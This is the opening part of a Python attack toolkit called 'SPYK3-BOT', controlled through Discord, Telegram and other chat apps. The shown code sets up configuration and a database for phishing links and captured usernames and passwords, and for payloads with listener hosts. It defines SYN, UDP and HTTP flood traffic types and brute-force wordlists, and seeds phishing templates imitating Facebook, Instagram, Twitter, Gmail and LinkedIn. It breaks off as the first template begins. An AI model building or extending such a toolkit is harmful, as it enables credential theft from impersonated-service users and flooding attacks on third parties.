#!/usr/bin/env python3
"""
🕷️ SPYK3-BOT v0.5.9
Author: Ian Carter Kulani
Description: Comprehensive cybersecurity tool with 2000+ commands including:
            - !crunch commands for brute force wordlist generation
            - SSH command execution on remote servers
            - Multi-platform integration (Discord, Telegram, WhatsApp, Slack, Signal, iMessage)
            - Time/Date commands with history tracking
            - REAL traffic generation (ICMP, TCP, UDP, HTTP, DNS, ARP)
            - Nikto web vulnerability scanning
            - Social engineering suite with phishing capabilities
            - IP management, threat detection, and reporting
            - Metasploit-style auxiliary modules
            - Session management and routing
            - Workspace organization
            - Cyberpunk Green/Orange theme interface
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import paramiko
import getpass
import socketserver
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from cryptography.fernet import Fernet

# =====================
# PLATFORM IMPORTS
# =====================

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False
    print("⚠️ Discord.py not available. Install with: pip install discord.py")

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False
    print("⚠️ Telethon not available. Install with: pip install telethon")

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False
    print("⚠️ Selenium not available. Install with: pip install selenium webdriver-manager")

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    from slack_sdk.socket_mode.response import SocketModeResponse
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False
    print("⚠️ Slack SDK not available. Install with: pip install slack-sdk")

# Signal
SIGNAL_CLI_AVAILABLE = shutil.which('signal-cli') is not None
if not SIGNAL_CLI_AVAILABLE:
    print("⚠️ signal-cli not found. Signal integration will be disabled")

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin' and shutil.which('osascript') is not None
if not IMESSAGE_AVAILABLE:
    print("⚠️ iMessage integration only available on macOS")

# Scapy for advanced packet generation
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP
    from scapy.all import send, sr1, srloop, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("⚠️ Scapy not available. Install with: pip install scapy")

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False
    print("⚠️ Python-whois not available. Install with: pip install python-whois")

# QR Code generation
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False
    print("⚠️ qrcode not available. Install with: pip install qrcode[pil]")

# URL shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False
    print("⚠️ pyshorteners not available. Install with: pip install pyshorteners")

# Colorama for theme colors
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    print("⚠️ Colorama not available. Install with: pip install colorama")

# =====================
# CYBERPUNK GREEN/ORANGE THEME COLORS
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        # Cyberpunk Green theme
        PRIMARY = Fore.GREEN + Style.BRIGHT          # Bright Green - Main headings
        SECONDARY = Fore.LIGHTGREEN_EX + Style.BRIGHT # Light Green - Subheadings
        ACCENT = Fore.CYAN + Style.BRIGHT            # Cyan - Accents
        
        # Orange theme for Metasploit-style commands
        ORANGE = Fore.YELLOW + Style.BRIGHT          # Orange/Yellow
        ORANGE1 = Fore.YELLOW + Style.BRIGHT         # Bright Orange
        ORANGE2 = Fore.LIGHTYELLOW_EX + Style.BRIGHT # Light Orange
        ORANGE3 = Fore.YELLOW                         # Dark Orange
        
        SUCCESS = Fore.GREEN + Style.BRIGHT          # Green - Success messages
        WARNING = Fore.YELLOW + Style.BRIGHT         # Yellow - Warnings
        ERROR = Fore.RED + Style.BRIGHT              # Red - Errors
        INFO = Fore.MAGENTA + Style.BRIGHT           # Magenta - Info
        
        DARK_GREEN = Fore.GREEN                        # Dark Green
        LIGHT_GREEN = Fore.LIGHTGREEN_EX               # Light Green
        RESET = Style.RESET_ALL                        # Reset
        
        # Background colors
        BG_GREEN = Back.GREEN + Fore.BLACK            # Green background with black text
        BG_ORANGE = Back.YELLOW + Fore.BLACK          # Orange background with black text
else:
    class Colors:
        PRIMARY = SECONDARY = ACCENT = ORANGE = ORANGE1 = ORANGE2 = ORANGE3 = SUCCESS = WARNING = ERROR = INFO = DARK_GREEN = LIGHT_GREEN = BG_GREEN = BG_ORANGE = RESET = ""

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".spyk3_bot"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DISCORD_CONFIG_FILE = os.path.join(CONFIG_DIR, "discord_config.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
WHATSAPP_CONFIG_FILE = os.path.join(CONFIG_DIR, "whatsapp_config.json")
SIGNAL_CONFIG_FILE = os.path.join(CONFIG_DIR, "signal_config.json")
SLACK_CONFIG_FILE = os.path.join(CONFIG_DIR, "slack_config.json")
IMESSAGE_CONFIG_FILE = os.path.join(CONFIG_DIR, "imessage_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "spyk3_data.db")
LOG_FILE = os.path.join(CONFIG_DIR, "spyk3_bot.log")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
SESSION_DATA_DIR = os.path.join(CONFIG_DIR, "sessions")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
REPORT_DIR = "reports"
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
PHISHING_LOGS_DIR = os.path.join(CONFIG_DIR, "phishing_logs")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
SSH_LOGS_DIR = os.path.join(CONFIG_DIR, "ssh_logs")
TIME_HISTORY_DIR = os.path.join(CONFIG_DIR, "time_history")
WORDLISTS_DIR = os.path.join(CONFIG_DIR, "wordlists")
CRUNCH_OUTPUT_DIR = os.path.join(CONFIG_DIR, "crunch_output")
TEMP_DIR = "temp"

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, 
    SESSION_DATA_DIR, NIKTO_RESULTS_DIR, WHATSAPP_SESSION_DIR,
    PHISHING_DIR, REPORT_DIR, TRAFFIC_LOGS_DIR, PHISHING_TEMPLATES_DIR,
    PHISHING_LOGS_DIR, CAPTURED_CREDENTIALS_DIR, SSH_KEYS_DIR,
    SSH_LOGS_DIR, TIME_HISTORY_DIR, WORDLISTS_DIR, CRUNCH_OUTPUT_DIR, TEMP_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("Spyk3Bot")

# =====================
# DATA CLASSES & ENUMS
# =====================

class ScanType:
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    VULNERABILITY = "vulnerability"
    FULL = "full"
    UDP = "udp"
    OS_DETECTION = "os_detection"
    SERVICE_DETECTION = "service_detection"
    WEB = "web"
    NIKTO = "nikto"

class TrafficType:
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    MIXED = "mixed"
    RANDOM = "random"

class Severity:
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class PhishingPlatform:
    FACEBOOK = "facebook"
    INSTAGRAM = "instagram"
    TWITTER = "twitter"
    LINKEDIN = "linkedin"
    GMAIL = "gmail"
    CUSTOM = "custom"

class CrunchPattern:
    LOWER = "lower"
    UPPER = "upper"
    MIXED = "mixed"
    NUMERIC = "numeric"
    ALPHANUM = "alphanum"
    SPECIAL = "special"
    HEX = "hex"
    CUSTOM = "custom"

@dataclass
class CrunchWordlist:
    id: str
    name: str
    filename: str
    min_length: int
    max_length: int
    charset: str
    pattern: str
    file_size: int
    line_count: int
    created_at: str
    status: str

@dataclass
class SSHServer:
    id: str
    name: str
    host: str
    port: int
    username: str
    password: Optional[str] = None
    key_file: Optional[str] = None
    use_key: bool = False
    timeout: int = 30
    created_at: str = None
    last_used: Optional[str] = None
    status: str = "disconnected"
    notes: str = ""

@dataclass
class SSHCommandResult:
    success: bool
    output: str
    error: Optional[str] = None
    execution_time: float = 0.0
    server: str = ""
    command: str = ""

@dataclass
class TrafficGenerator:
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"
    error: Optional[str] = None

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class ScanResult:
    target: str
    scan_type: str
    open_ports: List[Dict]
    timestamp: str
    success: bool
    error: Optional[str] = None
    vulnerabilities: Optional[List[Dict]] = None

@dataclass
class NiktoResult:
    target: str
    timestamp: str
    vulnerabilities: List[Dict]
    scan_time: float
    output_file: str
    success: bool
    error: Optional[str] = None

@dataclass
class PhishingLink:
    id: str
    platform: str
    original_url: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0
    captured_credentials: List[Dict] = None

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class ManagedIP:
    ip_address: str
    added_by: str
    added_date: str
    notes: str
    is_blocked: bool = False
    block_reason: Optional[str] = None
    blocked_date: Optional[str] = None

@dataclass
class TimeRecord:
    timestamp: str
    command: str
    user: str
    result: str

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    """Configuration manager with encryption for sensitive data"""
    
    DEFAULT_CONFIG = {
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "udp_flood_threshold": 500,
            "http_flood_threshold": 200,
            "ddos_threshold": 1000
        },
        "scanning": {
            "default_ports": "1-1000",
            "timeout": 30,
            "rate_limit": False
        },
        "security": {
            "auto_block": False,
            "auto_block_threshold": 5,
            "log_level": "INFO",
            "backup_enabled": True,
            "encrypt_passwords": True
        },
        "nikto": {
            "enabled": True,
            "timeout": 300,
            "max_targets": 10,
            "scan_level": 2,
            "ssl_ports": "443,8443,9443",
            "db_check": True
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "require_confirmation": True,
            "log_traffic": True,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_domain": "localhost",
            "default_port": 8080,
            "use_https": False,
            "capture_credentials": True,
            "log_all_requests": True,
            "auto_shorten_urls": True
        },
        "crunch": {
            "enabled": True,
            "max_wordlist_size_mb": 100,
            "max_line_count": 10000000,
            "default_output_format": "txt",
            "allow_compression": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5,
            "keep_alive": 60,
            "log_commands": True,
            "allow_command_execution": True
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin",
            "security_role": "Security Team"
        },
        "telegram": {
            "enabled": False,
            "api_id": "",
            "api_hash": "",
            "bot_token": "",
            "phone_number": "",
            "channel_id": ""
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "command_prefix": "/",
            "auto_login": False,
            "session_timeout": 3600,
            "allowed_contacts": []
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "command_prefix": "!",
            "signal_cli_path": "signal-cli",
            "allowed_numbers": []
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "command_prefix": "!",
            "allowed_users": []
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "command_prefix": "!",
            "allowed_numbers": []
        }
    }
    
    @staticmethod
    def get_encryption_key() -> bytes:
        """Get or create encryption key"""
        key_file = os.path.join(CONFIG_DIR, ".key")
        
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(key)
            return key
    
    @staticmethod
    def encrypt_data(data: str) -> str:
        """Encrypt sensitive data"""
        try:
            key = ConfigManager.get_encryption_key()
            f = Fernet(key)
            return f.encrypt(data.encode()).decode()
        except:
            return data
    
    @staticmethod
    def decrypt_data(data: str) -> str:
        """Decrypt sensitive data"""
        try:
            key = ConfigManager.get_encryption_key()
            f = Fernet(key)
            return f.decrypt(data.encode()).decode()
        except:
            return data
    
    @staticmethod
    def load_config() -> Dict:
        """Load configuration"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    # Merge with defaults
                    for key, value in ConfigManager.DEFAULT_CONFIG.items():
                        if key not in config:
                            config[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in config[key]:
                                    config[key][sub_key] = sub_value
                    return config
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        
        return ConfigManager.DEFAULT_CONFIG.copy()
    
    @staticmethod
    def save_config(config: Dict) -> bool:
        """Save configuration"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            logger.info("Configuration saved")
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False
    
    @staticmethod
    def load_ssh_config() -> List[Dict]:
        """Load SSH server configurations"""
        try:
            if os.path.exists(SSH_CONFIG_FILE):
                with open(SSH_CONFIG_FILE, 'r') as f:
                    configs = json.load(f)
                    
                    # Decrypt passwords if encrypted
                    for config in configs:
                        if config.get('password', '').startswith('enc:'):
                            config['password'] = ConfigManager.decrypt_data(config['password'][4:])
                    
                    return configs
        except Exception as e:
            logger.error(f"Failed to load SSH config: {e}")
        return []
    
    @staticmethod
    def save_ssh_config(configs: List[Dict], encrypt: bool = True) -> bool:
        """Save SSH server configurations"""
        try:
            # Make a copy to avoid modifying original
            configs_to_save = []
            for config in configs:
                config_copy = config.copy()
                
                # Encrypt passwords if requested
                if encrypt and config_copy.get('password'):
                    config_copy['password'] = 'enc:' + ConfigManager.encrypt_data(config_copy['password'])
                
                configs_to_save.append(config_copy)
            
            with open(SSH_CONFIG_FILE, 'w') as f:
                json.dump(configs_to_save, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save SSH config: {e}")
            return False

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager with session and workspace tracking"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        """Initialize database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS workspaces (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS hosts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                workspace_id INTEGER,
                ip_address TEXT NOT NULL,
                hostname TEXT,
                os_info TEXT,
                mac_address TEXT,
                vendor TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                notes TEXT,
                FOREIGN KEY (workspace_id) REFERENCES workspaces(id),
                UNIQUE(workspace_id, ip_address)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS services (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id INTEGER,
                port INTEGER NOT NULL,
                protocol TEXT,
                service_name TEXT,
                service_version TEXT,
                state TEXT,
                banner TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                FOREIGN KEY (host_id) REFERENCES hosts(id),
                UNIQUE(host_id, port, protocol)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id INTEGER,
                service_id INTEGER,
                name TEXT,
                description TEXT,
                severity TEXT,
                cve TEXT,
                cvss_score REAL,
                exploit_available BOOLEAN DEFAULT 0,
                discovered TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (host_id) REFERENCES hosts(id),
                FOREIGN KEY (service_id) REFERENCES services(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_type TEXT NOT NULL,
                session_id TEXT UNIQUE NOT NULL,
                target_host INTEGER,
                target_port INTEGER,
                lhost TEXT,
                lport INTEGER,
                payload TEXT,
                status TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                FOREIGN KEY (target_host) REFERENCES hosts(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS routes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                subnet TEXT NOT NULL,
                netmask TEXT NOT NULL,
                gateway TEXT,
                session_id INTEGER,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1,
                FOREIGN KEY (session_id) REFERENCES sessions(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                workspace_id INTEGER,
                scan_type TEXT NOT NULL,
                target TEXT NOT NULL,
                options TEXT,
                output_file TEXT,
                started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                completed_at TIMESTAMP,
                status TEXT,
                FOREIGN KEY (workspace_id) REFERENCES workspaces(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS payloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                payload_type TEXT NOT NULL,
                lhost TEXT NOT NULL,
                lport INTEGER NOT NULL,
                format TEXT NOT NULL,
                output_file TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS time_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                user TEXT,
                result TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_servers (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password TEXT,
                key_file TEXT,
                use_key BOOLEAN DEFAULT 0,
                timeout INTEGER DEFAULT 30,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                status TEXT DEFAULT 'disconnected',
                notes TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                server_id TEXT NOT NULL,
                server_name TEXT,
                command TEXT NOT NULL,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                error TEXT,
                execution_time REAL,
                executed_by TEXT,
                FOREIGN KEY (server_id) REFERENCES ssh_servers(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                server_id TEXT NOT NULL,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                end_time TIMESTAMP,
                commands_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'active',
                FOREIGN KEY (server_id) REFERENCES ssh_servers(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                blocked_date TIMESTAMP,
                threat_level INTEGER DEFAULT 0,
                last_scan TIMESTAMP,
                scan_count INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS system_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ip_blocks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                ip_address TEXT NOT NULL,
                action TEXT NOT NULL,
                reason TEXT,
                executed_by TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS whatsapp_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone_number TEXT UNIQUE NOT NULL,
                session_data TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                status TEXT DEFAULT 'inactive'
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS signal_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone_number TEXT UNIQUE NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                status TEXT DEFAULT 'inactive'
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT,
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                original_url TEXT,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                qr_code_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                additional_data TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                platform TEXT NOT NULL,
                html_content TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_status (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT UNIQUE NOT NULL,
                enabled BOOLEAN DEFAULT 0,
                last_connected TIMESTAMP,
                status TEXT,
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS user_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                user_name TEXT,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_activity TIMESTAMP,
                commands_count INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                scan_speed REAL,
                response_time REAL,
                packet_loss REAL,
                bandwidth REAL,
                connections_per_sec INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS network_connections (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                local_ip TEXT,
                local_port INTEGER,
                remote_ip TEXT,
                remote_port INTEGER,
                protocol TEXT,
                status TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS crunch_wordlists (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                filename TEXT NOT NULL,
                min_length INTEGER NOT NULL,
                max_length INTEGER NOT NULL,
                charset TEXT NOT NULL,
                pattern TEXT,
                file_size INTEGER DEFAULT 0,
                line_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'completed',
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS crunch_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                wordlist_id TEXT,
                min_length INTEGER,
                max_length INTEGER,
                charset TEXT,
                output_file TEXT,
                file_size INTEGER,
                line_count INTEGER,
                success BOOLEAN DEFAULT 1,
                execution_time REAL,
                FOREIGN KEY (wordlist_id) REFERENCES crunch_wordlists(id)
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        self.create_default_workspace()
        self._init_phishing_templates()
    
    def create_default_workspace(self):
        """Create default workspace"""
        try:
            self.cursor.execute('''
                INSERT OR IGNORE INTO workspaces (name, description, active)
                VALUES ('default', 'Default workspace', 1)
            ''')
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to create default workspace: {e}")
    
    def _init_phishing_templates(self):
        """Initialize default phishing templates"""
        templates = {
            "facebook_default": {"platform": "facebook", "html": self._get_facebook_template()},
            "instagram_default": {"platform": "instagram", "html": self._get_instagram_template()},
            "twitter_default": {"platform": "twitter", "html": self._get_twitter_template()},
            "gmail_default": {"platform": "gmail", "html": self._get_gmail_template()},
            "linkedin_default": {"platform": "linkedin", "html": self._get_linkedin_template()}
        }
        
        for name, template in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, template['platform'], template['html']))
            except Exception as e:
                logger.error(f"Failed to insert template {name}: {e}")
        
        self.conn.commit()
    
    def _get_facebook_template(self):
        return """<!DOCTYPE html>
<html>
<head>
